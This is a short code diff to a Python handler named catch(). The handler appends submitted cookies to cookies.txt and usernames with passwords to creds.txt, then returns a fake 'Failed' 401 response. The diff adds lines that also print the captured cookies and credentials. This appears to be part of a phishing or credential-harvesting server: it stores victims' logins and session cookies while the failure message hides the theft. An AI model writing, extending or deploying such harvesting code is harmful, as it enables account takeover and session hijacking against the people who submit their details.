@@ -18,9 +18,13 @@ def catch():
 
 		with open("cookies.txt", "a") as file:
 			file.write(f"{cred}{data["cookies"]}\n\n")
+
+		print(f"{cred}{data["cookies"]}\n\n")
 	else:
 		with open("creds.txt", "a") as cred_file:
 			cred_file.write(f"{data['username']} == {data['password']}\n")
+
+		print(f"{data['username']} == {data['password']}\n")
 
 	return ({"message": "Failed"}, 401)
 
